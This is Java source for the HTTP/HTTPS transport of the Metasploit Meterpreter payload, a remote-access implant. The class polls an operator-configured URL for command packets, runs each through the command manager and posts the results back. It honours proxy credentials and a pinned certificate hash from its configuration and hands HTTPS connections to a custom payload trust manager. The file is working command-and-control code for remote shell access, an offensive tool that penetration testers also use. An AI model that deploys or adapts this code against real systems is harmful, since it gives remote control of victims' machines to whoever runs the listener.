package com.metasploit.meterpreter;

import com.metasploit.meterpreter.command.Command;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.EOFException;
import java.io.IOException;
import java.io.OutputStream;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLConnection;

public class HttpTransport extends Transport {
    private static final int UA_LEN = 256;
    private static final int PROXY_HOST_LEN = 128;
    private static final int PROXY_USER_LEN = 64;
    private static final int PROXY_PASS_LEN = 64;
    private static final int CERT_HASH_LEN = 20;
    private static final String TRUST_MANAGER = "com.metasploit.meterpreter.PayloadTrustManager";

    private URL targetUrl = null;
    private URL nextUrl = null;
    private String userAgent;
    private String proxy;
    private String proxyUser;
    private String proxyPass;
    private byte[] certHash;

    public HttpTransport(String url) throws MalformedURLException {
        super(url);

        this.targetUrl = new URL(url);
    }

    public void bind(DataInputStream in, OutputStream rawOut) {
        // http, we don't bind to anything as we're stateless
    }

    public boolean switchUri(String uri) {
        try {
            // can't use getAuthority() here thanks to java 1.2. Ugh.
            String newUrl = this.targetUrl.getProtocol() + "://"
              + this.targetUrl.getHost() + ":"
              + this.targetUrl.getPort()
              + uri;
            this.nextUrl = new URL(newUrl);
            return true;
        }
        catch (MalformedURLException ex) {
          return false;
        }
    }

    public int parseConfig(byte[] configuration, int offset) {
        offset = this.parseTimeouts(configuration, offset);

        this.proxy = Meterpreter.readString(configuration, offset, PROXY_HOST_LEN);
        offset += PROXY_HOST_LEN;

        this.proxyUser = Meterpreter.readString(configuration, offset, PROXY_USER_LEN);
        offset += PROXY_USER_LEN;

        this.proxyPass = Meterpreter.readString(configuration, offset, PROXY_PASS_LEN);
        offset += PROXY_PASS_LEN;

        this.userAgent = Meterpreter.readString(configuration, offset, UA_LEN);
        offset += UA_LEN;

        this.certHash = null;
        byte[] loadedHash = Meterpreter.readBytes(configuration, offset, CERT_HASH_LEN);
        offset += CERT_HASH_LEN;

        // we only store the cert hash value if it's got a value
        for (int i = 0; i < loadedHash.length; i++) {
            if (loadedHash[i] != 0) {
                this.certHash = loadedHash;
                break;
            }
        }

        return offset;
    }

    public String getUserAgent() {
        return this.userAgent;
    }

    public void setUserAgent(String userAgent) {
        this.userAgent = userAgent;
    }

    public String getProxy() {
        return this.proxy;
    }

    public void setProxy(String proxy) {
        this.proxy = proxy;
    }

    public String getProxyUser() {
        return this.proxyUser;
    }

    public void setProxyUser(String proxyUser) {
        this.proxyUser = proxyUser;
    }

    public String getProxyPass() {
        return this.proxyPass;
    }

    public void setProxyPass(String proxyPass) {
        this.proxyPass = proxyPass;
    }

    public byte[] getCertHash() {
        return this.certHash;
    }

    public void setCertHash(byte[] certHash) {
        this.certHash = certHash;
    }

    public void disconnect() {
    }

    protected boolean tryConnect(Meterpreter met) throws IOException {
        URLConnection conn = this.createConnection();

        if (conn == null) {
            return false;
        }

        DataInputStream inputStream = new DataInputStream(conn.getInputStream());

        try {
            TLVPacket request = this.readAndDecodePacket(inputStream);
            inputStream.close();

            // things are looking good, handle the packet and return true, as this
            // is the situation that happens on initial connect (not reconnect)
            TLVPacket response = request.createResponse();
            int result = met.getCommandManager().executeCommand(met, request, response);
            this.writePacket(response, TLVPacket.PACKET_TYPE_RESPONSE);

            return true;
        }
        catch (EOFException ex) {
            // this can happens on reconnect
            return true;
        }
        catch (Exception ex) {
        }

        // we get here, thins aren't good.
        return false;
    }

    public TLVPacket readPacket() throws IOException {
        URLConnection conn = this.createConnection();

        if (conn == null) {
            return null;
        }

        DataInputStream inputStream = new DataInputStream(conn.getInputStream());

        try {
            TLVPacket request = this.readAndDecodePacket(inputStream);
            inputStream.close();
            return request;
        }
        catch (EOFException ex) {
        }

        return null;
    }

    public void writePacket(TLVPacket packet, int type) throws IOException {
        URLConnection conn = this.createConnection();

        if (conn == null) {
            return;
        }

        conn.setDoOutput(true);
        DataOutputStream outputStream = new DataOutputStream(conn.getOutputStream());
        this.encodePacketAndWrite(packet, type, outputStream);
        outputStream.close();

        DataInputStream inputStream = new DataInputStream(conn.getInputStream());

        try {
            this.readAndDecodePacket(inputStream);
            // not really worried about the response, we just want to read a packet out of it
            // and move on
            inputStream.close();
        }
        catch (EOFException ex) {
            // log error?
        }
    }

    public boolean dispatch(Meterpreter met) {
        long lastPacket = System.currentTimeMillis();
        long ecount = 0;

        while (!met.hasSessionExpired() &&
            System.currentTimeMillis() < lastPacket + this.commTimeout) {
            try {
                TLVPacket request = this.readPacket();

                if (request != null) {
                    ecount = 0;

                    // got a packet, update the timestamp
                    lastPacket = System.currentTimeMillis();

                    TLVPacket response = request.createResponse();
                    int result = met.getCommandManager().executeCommand(met, request, response);

                    this.writePacket(response, TLVPacket.PACKET_TYPE_RESPONSE);

                    if (result == Command.EXIT_DISPATCH) {
                        return true;
                    }
                } else {
                    long delay = ecount++ * 10;
                    if (ecount >= 10) {
                        delay *= 10;
                    }
                    met.sleep(Math.min(10000, delay));
                }
            } catch (Exception ex) {
                // any other type of exception isn't good.
                break;
            }

            // see if we switched URLs along the way, and if we did, move it on over.
            // This is really only used for stageless payloads (not yet implemented in
            // msf for this, but we're getting there). The command for this hasn't yet
            // been wired in.
            if (this.nextUrl != null) {
                this.url = this.nextUrl.toString();
                this.targetUrl = this.nextUrl;
                this.nextUrl = null;
            }
        }

        // if we get here we assume things aren't good.
        return false;
    }

    private URLConnection createConnection() {
        URLConnection conn = null;

        try {
            conn = this.targetUrl.openConnection();

            if (this.targetUrl.getProtocol().equals("https")) {
                try {
                    Class.forName(TRUST_MANAGER).getMethod("useFor", new Class[]{URLConnection.class})
                      .invoke(null, new Object[]{conn});
                }
                catch (Exception ex) {
                    // perhaps log?
                }
            }
        }
        catch (IOException ex) {
            if (conn != null) {
                conn = null;
            }
        }

        return conn;
    }
}

